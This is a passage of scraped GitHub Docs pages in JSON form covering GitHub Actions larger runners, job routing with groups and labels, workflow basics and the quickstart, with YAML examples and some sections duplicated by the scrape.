          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the list of runners, select the runner you would like to edit.",
          "Select a new size for the runner from the list of available options under \"Size.\" The available sizes depend on the image that is installed on the runner.",
          "ClickSave."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Changing the image of a larger runner"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the list of runners, select the runner you would like to edit.",
          "Select a new image for the runner from the list of available options under \"Image.\" The available images are limited to GitHub-owned images.",
          "ClickSave."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring autoscaling for larger runners"
      },
      {
        "type": "paragraph",
        "text": "You can control the maximum number of jobs allowed to run concurrently for specific runner sets. Setting this field to a higher value can help prevent workflows being blocked due to parallelism."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the list of runners, select the runner you would like to edit.",
          "In the \"Auto-scaling\" section, under \"Maximum Job Concurrency,\" enter the maximum number of jobs you would like to allow to run at the same time.",
          "ClickSave."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating static IP addresses for larger runners"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To use static IP addresses, your organization must use GitHub Enterprise Cloud. For more information about how you can try GitHub Enterprise Cloud for free, seeSetting up a trial of GitHub Enterprise Cloud."
      },
      {
        "type": "paragraph",
        "text": "You can enable static IP addresses for larger runners. When you do this, the larger runners are assigned static IP address ranges. All IP addresses in the range assigned are usable and not in CIDR notation. By default, you can configure up to 10 different larger runners with IP ranges for your account. If you would like to use more than 10 larger runners with static IP address ranges, please contact us through theGitHub Support portal."
      },
      {
        "type": "paragraph",
        "text": "The number of available IP addresses in the assigned ranges does not restrict number of concurrent jobs specified for autoscaling. Within a runner pool, there is a load balancer which allows for high reuse of the IP addresses in the assigned ranges. This ensures your workflows can run concurrently at scale while each machine is assigned a static IP address."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the list of runners, select the runner you would like to edit.",
          "To assign static IP addresses to the runner, under \"Networking,\" checkAssign unique & static public IP address ranges for this runner.",
          "ClickSave."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/running-jobs-on-larger-runners",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Running jobs on your runner"
      },
      {
        "type": "paragraph",
        "text": "Once your runner type has been defined, you can update your workflow YAML files to send jobs to your newly created runner instances for processing. You can use runner groups or labels to define where your jobs run."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Larger runners are automatically assigned a default label that corresponds to the runner name. You cannot add custom labels to larger runners, but you can use the default labels or the runner's group to send jobs to specific types of runners."
      },
      {
        "type": "paragraph",
        "text": "Only owner or administrator accounts can see the runner settings. Non-administrative users can contact the organization owner to find out which runners are enabled. Your organization owner can create new runners and runner groups, as well as configure permissions to specify which repositories can access a runner group. For more information, seeManaging larger runners."
      },
      {
        "type": "paragraph",
        "text": "Once your runner type has been defined, you can update your workflow YAML files to send jobs to your newly created runner instances for processing. You can use runner groups or labels to define where your jobs run."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Larger runners are automatically assigned a default label that corresponds to the runner name. You cannot add custom labels to larger runners, but you can use the default labels or the runner's group to send jobs to specific types of runners."
      },
      {
        "type": "paragraph",
        "text": "Only owner or administrator accounts can see the runner settings. Non-administrative users can contact the organization owner to find out which runners are enabled. Your organization owner can create new runners and runner groups, as well as configure permissions to specify which repositories can access a runner group. For more information, seeManaging larger runners."
      },
      {
        "type": "paragraph",
        "text": "Once your runner type has been defined, you can update your workflow YAML files to send jobs to runner instances for processing. To run jobs on macOS larger runners, update theruns-onkey in your workflow YAML files to use one of the GitHub-defined labels for macOS runners. For more information, seeAvailable macOS larger runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Available macOS larger runners"
      },
      {
        "type": "paragraph",
        "text": "Use the labels in the table below to run your workflows on the corresponding macOS larger runner."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "For macOS larger runners, the-latestrunner label uses the macOS 12 runner image. For macOS Xlarge, the-latestrunner label uses the macOS 13 runner image"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing available runners for a repository"
      },
      {
        "type": "paragraph",
        "text": "If you haverepo: writeaccess to a repository, you can view a list of the runners available to the repository."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, under the \"Management\" section, clickRunners.",
          "Review the list of available runners for the repository.",
          "Optionally, to copy a runner's label to use it in a workflow, clickto the right of the runner, then clickCopy label."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Enterprise and organization owners can create runners from this page. To create a new runner, clickNew runnerat the top right of the list of runners to add runners to the repository."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeManaging larger runnersandAdding self-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using groups to control where jobs are run"
      },
      {
        "type": "paragraph",
        "text": "In this example, Ubuntu runners have been added to a group calledubuntu-runners. Theruns-onkey sends the job to any available runner in theubuntu-runnersgroup:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: \n      group: ubuntu-runners\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using groups to control where jobs are run"
      },
      {
        "type": "paragraph",
        "text": "In this example, Ubuntu runners have been added to a group calledubuntu-runners. Theruns-onkey sends the job to any available runner in theubuntu-runnersgroup:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: \n      group: ubuntu-runners\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using labels to control where jobs are run"
      },
      {
        "type": "paragraph",
        "text": "You can implicitly pass a label to theruns-onkey by using the syntaxruns-on: LABEL. Alternatively, you can use thelabelskey, as shown in the example below."
      },
      {
        "type": "paragraph",
        "text": "In this example, theruns-onkey sends the job to any available runner that has been assigned theubuntu-20.04-16corelabel:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "paragraph",
        "text": "Anyone with write access to an Actions-enabled repository can find out the labels for the runners that are available in that repository. SeeRunning jobs on larger runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using labels to control where jobs are run"
      },
      {
        "type": "paragraph",
        "text": "You can implicitly pass a label to theruns-onkey by using the syntaxruns-on: LABEL. Alternatively, you can use thelabelskey, as shown in the example below."
      },
      {
        "type": "paragraph",
        "text": "In this example, theruns-onkey sends the job to any available runner that has been assigned thewindows-2022-16corelabel:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      labels: windows-2022-16core\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "paragraph",
        "text": "Anyone with write access to an Actions-enabled repository can find out the labels for the runners that are available in that repository. SeeRunning jobs on larger runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Targeting macOS larger runners in a workflow"
      },
      {
        "type": "paragraph",
        "text": "To run your workflows on macOS larger runners, set the value of theruns-onkey to a label associated with a macOS larger runner. For a list of macOS larger runner labels, seeAvailable macOS larger runners."
      },
      {
        "type": "paragraph",
        "text": "In this example, the workflow uses a label that is associated with macOS XL runners. Theruns-onkey sends the job to any available runner with a matching label:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions-testing\non: [push]\njobs:\n  build:\n    runs-on: macos-13-xlarge\n    steps:\n      - uses: actions/checkout@v4\n      - name: Build\n        run: swift build\n      - name: Run tests\n        run: swift test"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using labels and groups to control where jobs are run"
      },
      {
        "type": "paragraph",
        "text": "When you combine groups and labels, the runner must meet both requirements to be eligible to run the job."
      },
      {
        "type": "paragraph",
        "text": "In this example, a runner group calledubuntu-runnersis populated with Ubuntu runners, which have also been assigned the labelubuntu-20.04-16core. Theruns-onkey combinesgroupandlabelsso that the job is routed to any available runner within the group that also has a matching label:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      group: ubuntu-runners\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using labels and groups to control where jobs are run"
      },
      {
        "type": "paragraph",
        "text": "When you combine groups and labels, the runner must meet both requirements to be eligible to run the job."
      },
      {
        "type": "paragraph",
        "text": "In this example, a runner group calledubuntu-runnersis populated with Ubuntu runners, which have also been assigned the labelubuntu-20.04-16core. Theruns-onkey combinesgroupandlabelsso that the job is routed to any available runner within the group that also has a matching label:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      group: ubuntu-runners\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Troubleshooting larger runners"
      },
      {
        "type": "paragraph",
        "text": "If you notice the jobs that target your larger runners are delayed or not running, there are several factors that may be causing this."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Concurrency settings:You may have reached your maximum concurrency limit. If you would like to enable more jobs to run in parallel, you can update your autoscaling settings to a larger number. For more information, seeManaging larger runners.",
          "Repository permissions:Ensure you have the appropriate repository permissions enabled for your larger runners. By default, enterprise runners are not available at the repository level and must be manually enabled by an organization administrator. For more information, seeManaging larger runners.",
          "Billing information:You must have a valid credit card on file in order to use larger runners. After adding a credit card to your account, it can take up to 10 minutes to enable the use of your larger runners. For more information, seeManaging your payment and billing information.",
          "Spending limit:Your GitHub Actions spending limit must be set to a value greater than zero. For more information, seeManaging your spending limit for GitHub Actions.",
          "Fair use policy:GitHub has a fair use policy that begins to throttle jobs based on several factors, such as how many jobs you are running or how many jobs are running across the entirety of GitHub Actions.",
          "Job queue to assign time:Job queue to assign time refers to the time between a job request and GitHub assigning a VM to execute the job. Standard GitHub-hosted runners utilizing prescribed YAML workflow labels (such asubuntu-latest) are always in a \"warm\" state. With larger runners, a warm machine may not be ready to pick up a job on first request as the pools for these machines are smaller. As a result, GitHub may need to create a new VM, which increases the queue to assign time. Once a runner is in use, VMs are readily for subsequent workflow runs, reducing the queue to assign time for future workflow runs over the next 24 hours."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you notice the jobs that target your larger runners are delayed or not running, there are several factors that may be causing this."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Concurrency settings:You may have reached your maximum concurrency limit. If you would like to enable more jobs to run in parallel, you can update your autoscaling settings to a larger number. For more information, seeManaging larger runners.",
          "Repository permissions:Ensure you have the appropriate repository permissions enabled for your larger runners. By default, enterprise runners are not available at the repository level and must be manually enabled by an organization administrator. For more information, seeManaging larger runners.",
          "Billing information:You must have a valid credit card on file in order to use larger runners. After adding a credit card to your account, it can take up to 10 minutes to enable the use of your larger runners. For more information, seeManaging your payment and billing information.",
          "Spending limit:Your GitHub Actions spending limit must be set to a value greater than zero. For more information, seeManaging your spending limit for GitHub Actions.",
          "Fair use policy:GitHub has a fair use policy that begins to throttle jobs based on several factors, such as how many jobs you are running or how many jobs are running across the entirety of GitHub Actions.",
          "Job queue to assign time:Job queue to assign time refers to the time between a job request and GitHub assigning a VM to execute the job. Standard GitHub-hosted runners utilizing prescribed YAML workflow labels (such asubuntu-latest) are always in a \"warm\" state. With larger runners, a warm machine may not be ready to pick up a job on first request as the pools for these machines are smaller. As a result, GitHub may need to create a new VM, which increases the queue to assign time. Once a runner is in use, VMs are readily for subsequent workflow runs, reducing the queue to assign time for future workflow runs over the next 24 hours."
        ]
      },
      {
        "type": "paragraph",
        "text": "Because macOS arm64 does not support Node 12, macOS larger runners automatically use Node 16 to execute any JavaScript action written for Node 12. Some community actions may not be compatible with Node 16. If you use an action that requires a different Node version, you may need to manually install a specific version at runtime."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "ARM-powered runners are currently in public preview and are subject to change."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/about-workflows",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About workflows"
      },
      {
        "type": "paragraph",
        "text": "Aworkflowis a configurable automated process that will run one or more jobs. Workflows are defined by a YAML file checked in to your repository and will run when triggered by an event in your repository, or they can be triggered manually, or at a defined schedule."
      },
      {
        "type": "paragraph",
        "text": "Workflows are defined in the.github/workflowsdirectory in a repository. A repository can have multiple workflows, each of which can perform a different set of tasks such as:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Building and testing pull requests",
          "Deploying your application every time a release is created",
          "Adding a label whenever a new issue is opened"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Workflow basics"
      },
      {
        "type": "paragraph",
        "text": "A workflow must contain the following basic components:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "One or moreeventsthat will trigger the workflow.",
          "One or morejobs, each of which will execute on arunnermachine and run a series of one or moresteps.",
          "Each step can either run a script that you define or run an action, which is a reusable extension that can simplify your workflow."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information on these basic components, seeUnderstanding GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Triggering a workflow"
      },
      {
        "type": "paragraph",
        "text": "Workflow triggers are events that cause a workflow to run. These events can be:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Events that occur in your workflow's repository",
          "Events that occur outside of GitHub and trigger arepository_dispatchevent on GitHub",
          "Scheduled times",
          "Manual"
        ]
      },
      {
        "type": "paragraph",
        "text": "For example, you can configure your workflow to run when a push is made to the default branch of your repository, when a release is created, or when an issue is opened."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeTriggering a workflow, and for a full list of events, seeEvents that trigger workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Workflow syntax"
      },
      {
        "type": "paragraph",
        "text": "Workflows are defined using YAML. For the full reference of the YAML syntax for authoring workflows, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For more on managing workflow runs, such as re-running, cancelling, or deleting a workflow run, seeManaging workflow runs and deployments."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using workflow templates"
      },
      {
        "type": "paragraph",
        "text": "GitHub provides preconfigured workflow templates that you can use as-is or customize to create your own workflow. GitHub analyzes your code and shows you workflow templates that might be useful for your repository. For example, if your repository contains Node.js code, you'll see suggestions for Node.js projects."
      },
      {
        "type": "paragraph",
        "text": "These workflow templates are designed to help you get up and running quickly, offering a range of configurations such as:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "CI:Continuous Integration workflows",
          "Deployments:Deployment workflows",
          "Automation:Automating workflows",
          "Code Scanning:Code Scanning workflows",
          "Pages:Pages workflows"
        ]
      },
      {
        "type": "paragraph",
        "text": "Use these workflows as a starting place to build your custom workflow or use them as-is. You can browse the full list of workflow templates in theactions/starter-workflowsrepository. For more information, seeUsing workflow templates."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Advanced workflow features"
      },
      {
        "type": "paragraph",
        "text": "This section briefly describes some of the advanced features of GitHub Actions that help you create more complex workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Storing secrets"
      },
      {
        "type": "paragraph",
        "text": "If your workflows use sensitive data, such as passwords or certificates, you can save these in GitHub assecretsand then use them in your workflows as environment variables. This means that you will be able to create and share workflows without having to embed sensitive values directly in the workflow's YAML source."
      },
      {
        "type": "paragraph",
        "text": "This example job demonstrates how to reference an existing secret as an environment variable, and send it as a parameter to an example command."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example-job:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Retrieve secret\n        env:\n          super_secret: ${{ secrets.SUPERSECRET }}\n        run: |\n          example-command \"$super_secret\""
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Creating dependent jobs"
      },
      {
        "type": "paragraph",
        "text": "By default, the jobs in your workflow all run in parallel at the same time. If you have a job that must only run after another job has completed, you can use theneedskeyword to create this dependency. If one of the jobs fails, all dependent jobs are skipped; however, if you need the jobs to continue, you can define this using theifconditional statement."
      },
      {
        "type": "paragraph",
        "text": "In this example, thesetup,build, andtestjobs run in series, withbuildandtestbeing dependent on the successful completion of the job that precedes them:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./setup_server.sh\n  build:\n    needs: setup\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./build_server.sh\n  test:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./test_server.sh"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUsing jobs in a workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a matrix"
      },
      {
        "type": "paragraph",
        "text": "A matrix strategy lets you use variables in a single job definition to automatically create multiple job runs that are based on the combinations of the variables. For example, you can use a matrix strategy to test your code in multiple versions of a language or on multiple operating systems. The matrix is created using thestrategykeyword, which receives the build options as an array. For example, this matrix will run the job multiple times, using different versions of Node.js:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node: [14, 16]\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node }}"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeRunning variations of jobs in a workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Caching dependencies"
      },
      {
        "type": "paragraph",
        "text": "If your jobs regularly reuse dependencies, you can consider caching these files to help improve performance. Once the cache is created, it is available to all workflows in the same repository."
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how to cache the~/.npmdirectory:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example-job:\n    steps:\n      - name: Cache node modules\n        uses: actions/cache@v4\n        env:\n          cache-name: cache-node-modules\n        with:\n          path: ~/.npm\n          key: ${{ runner.os }}-build-${{ env.cache-name }}-${{ hashFiles('**/package-lock.json') }}\n          restore-keys: |\n            ${{ runner.os }}-build-${{ env.cache-name }}-"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using databases and service containers"
      },
      {
        "type": "paragraph",
        "text": "If your job requires a database or cache service, you can use theserviceskeyword to create an ephemeral container to host the service; the resulting container is then available to all steps in that job and is removed when the job has completed. This example demonstrates how a job can useservicesto create apostgrescontainer, and then usenodeto connect to the service."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  container-job:\n    runs-on: ubuntu-latest\n    container: node:20-bookworm-slim\n    services:\n      postgres:\n        image: postgres\n    steps:\n      - name: Check out repository code\n        uses: actions/checkout@v4\n      - name: Install dependencies\n        run: npm ci\n      - name: Connect to PostgreSQL\n        run: node client.js\n        env:\n          POSTGRES_HOST: postgres\n          POSTGRES_PORT: 5432"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUsing containerized services."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using labels to route workflows"
      },
      {
        "type": "paragraph",
        "text": "If you want to be sure that a particular type of runner will process your job, you can use labels to control where jobs are executed. You can assign labels to a self-hosted runner in addition to their default label ofself-hosted. Then, you can refer to these labels in your YAML workflow, ensuring that the job is routed in a predictable way. GitHub-hosted runners have predefined labels assigned."
      },
      {
        "type": "paragraph",
        "text": "This example shows how a workflow can use labels to specify the required runner:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example-job:\n    runs-on: [self-hosted, linux, x64, gpu]"
      },
      {
        "type": "paragraph",
        "text": "A workflow will only run on a runner that has all the labels in theruns-onarray. The job will preferentially go to an idle self-hosted runner with the specified labels. If none are available and a GitHub-hosted runner with the specified labels exists, the job will go to a GitHub-hosted runner."
      },
      {
        "type": "paragraph",
        "text": "To learn more about self-hosted runner labels, seeUsing labels with self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "To learn more about GitHub-hosted runner labels, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Reusing workflows"
      },
      {
        "type": "paragraph",
        "text": "You can call one workflow from within another workflow. This allows you to reuse workflows, avoiding duplication and making your workflows easier to maintain. For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Security hardening for workflows"
      },
      {
        "type": "paragraph",
        "text": "GitHub provides security features that you can use to increase the security of your workflows. You can use GitHub's built-in features to ensure you are notified about vulnerabilities in the actions you consume, or to automate the process of keeping the actions in your workflows up to date. For more information, seeUsing GitHub's security features to secure your use of GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using environments"
      },
      {
        "type": "paragraph",
        "text": "You can configure environments with protection rules and secrets to control the execution of jobs in a workflow. Each job in a workflow can reference a single environment. Any protection rules configured for the environment must pass before a job referencing the environment is sent to a runner. For more information, seeManaging environments for deployment."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/quickstart",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline. You can create workflows that run tests whenever you push a change to your repository, or that deploy merged pull requests to production."
      },
      {
        "type": "paragraph",
        "text": "This quickstart guide shows you how to use the user interface of GitHub to add a workflow that demonstrates some of the essential features of GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "To get started with preconfigured workflows, browse through the list of templates in theactions/starter-workflowsrepository. For more information, seeUsing workflow templates."
      },
      {
        "type": "paragraph",
        "text": "For an overview of GitHub Actions workflows, seeAbout workflows. If you want to learn about the various components that make up GitHub Actions, seeUnderstanding GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using workflow templates"
      },
      {
        "type": "paragraph",
        "text": "GitHub provides preconfigured workflow templates that you can use as-is or customize to create your own workflow. GitHub analyzes your code and shows you workflow templates that might be useful for your repository. For example, if your repository contains Node.js code, you'll see suggestions for Node.js projects."
      },
      {
        "type": "paragraph",
        "text": "These workflow templates are designed to help you get up and running quickly, offering a range of configurations such as:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "CI:Continuous Integration workflows",
          "Deployments:Deployment workflows",
          "Automation:Automating workflows",
          "Code Scanning:Code Scanning workflows",
          "Pages:Pages workflows"
        ]
      },
      {
        "type": "paragraph",
        "text": "Use these workflows as a starting place to build your custom workflow or use them as-is. You can browse the full list of workflow templates in theactions/starter-workflowsrepository. For more information, seeUsing workflow templates."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "This guide assumes that:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You have at least a basic knowledge of how to use GitHub. If you don't, you'll find it helpful to read some of the articles in the documentation for repositories and pull requests first. For example, seeQuickstart for repositories,About branches, andAbout pull requests.",
          "You have a repository on GitHub where you can add files.",
          "You have access to GitHub Actions.NoteIf theActionstab is not displayed under the name of your repository on GitHub, it may be because Actions is disabled for the repository. For more information, seeManaging GitHub Actions settings for a repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating your first workflow"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In your repository on GitHub, create a workflow file calledgithub-actions-demo.ymlin the.github/workflowsdirectory. To do this:If the.github/workflowsdirectory already exists, navigate to that directory on GitHub, clickAdd file, then clickCreate new file, and name the filegithub-actions-demo.yml.If your repository doesn't have a.github/workflowsdirectory, go to the main page of the repository on GitHub, clickAdd file, then clickCreate new file, and name the file.github/workflows/github-actions-demo.yml. This creates the.githubandworkflowsdirectories and thegithub-actions-demo.ymlfile in a single step.NoteFor GitHub to discover any GitHub Actions workflows in your repository, you must save the workflow files in a directory called.github/workflows.You can give the workflow file any name you like, but you must use.ymlor.yamlas the file name extension. YAML is a markup language that's commonly used for configuration files.",
          "If the.github/workflowsdirectory already exists, navigate to that directory on GitHub, clickAdd file, then clickCreate new file, and name the filegithub-actions-demo.yml.",
          "If your repository doesn't have a.github/workflowsdirectory, go to the main page of the repository on GitHub, clickAdd file, then clickCreate new file, and name the file.github/workflows/github-actions-demo.yml. This creates the.githubandworkflowsdirectories and thegithub-actions-demo.ymlfile in a single step.",
          "Copy the following YAML contents into thegithub-actions-demo.ymlfile:YAMLname: GitHub Actions Demo\nrun-name: ${{ github.actor }} is testing out GitHub Actions 🚀\non: [push]\njobs:\n  Explore-GitHub-Actions:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"🎉 The job was automatically triggered by a ${{ github.event_name }} event.\"\n      - run: echo \"🐧 This job is now running on a ${{ runner.os }} server hosted by GitHub!\"\n      - run: echo \"🔎 The name of your branch is ${{ github.ref }} and your repository is ${{ github.repository }}.\"\n      - name: Check out repository code\n        uses: actions/checkout@v4\n      - run: echo \"💡 The ${{ github.repository }} repository has been cloned to the runner.\"\n      - run: echo \"🖥️ The workflow is now ready to test your code on the runner.\"\n      - name: List files in the repository\n        run: |\n          ls ${{ github.workspace }}\n      - run: echo \"🍏 This job's status is ${{ job.status }}.\"name:GitHubActionsDemorun-name:${{github.actor}}istestingoutGitHubActions🚀on:[push]jobs:Explore-GitHub-Actions:runs-on:ubuntu-lateststeps:-run:echo\"🎉 The job was automatically triggered by a ${{ github.event_name }}event.\"-run:echo\"🐧 This job is now running on a ${{ runner.os }}server hosted by GitHub!\"-run:echo\"🔎 The name of your branch is ${{ github.ref }}and your repository is ${{ github.repository }}.\"-name:Checkoutrepositorycodeuses:actions/checkout@v4-run:echo\"💡 The ${{ github.repository }}repository has been cloned to the runner.\"-run:echo\"🖥️ The workflow is now ready to test your code on the runner.\"-name:Listfilesintherepositoryrun:|\n          ls ${{ github.workspace }}-run:echo\"🍏 This job's status is ${{ job.status }}.\"At this stage you don't need to understand the details of this workflow. For now, you can just copy and paste the contents into the file. After completing this quickstart guide, you can learn about the syntax of workflow files inAbout workflows, and for an explanation of GitHub Actions contexts, such as${{ github.actor }}and${{ github.event_name }}, seeAccessing contextual information about workflow runs.",
          "ClickCommit changes.",
          "In the \"Propose changes\" dialog, select either the option to commit to the default branch or the option to create a new branch and start a pull request. Then clickCommit changesorPropose changes."
        ]
      },
      {
        "type": "paragraph",
        "text": "Committing the workflow file to a branch in your repository triggers thepushevent and runs your workflow."
      },
      {
        "type": "paragraph",
        "text": "If you chose to start a pull request, you can continue and create the pull request, but this is not necessary for the purposes of this quickstart because the commit has still been made to a branch and will trigger the new workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing your workflow results"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to display, in this example \"GitHub Actions Demo.\"",
          "From the list of workflow runs, click the name of the run you want to see, in this example \"USERNAME is testing out GitHub Actions.\"",
          "In the left sidebar of the workflow run page, underJobs, click theExplore-GitHub-Actionsjob.",
          "The log shows you how each of the steps was processed. Expand any of the steps to view its details.For example, you can see the list of files in your repository:"
        ]
      },
      {
        "type": "paragraph",
        "text": "The example workflow you just added is triggered each time code is pushed to the branch, and shows you how GitHub Actions can work with the contents of your repository. For an in-depth tutorial, seeUnderstanding GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions can help you automate nearly every aspect of your application development processes. Ready to get started? Here are some helpful resources for taking your next steps with GitHub Actions:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To create a GitHub Actions workflow, seeUsing workflow templates.",
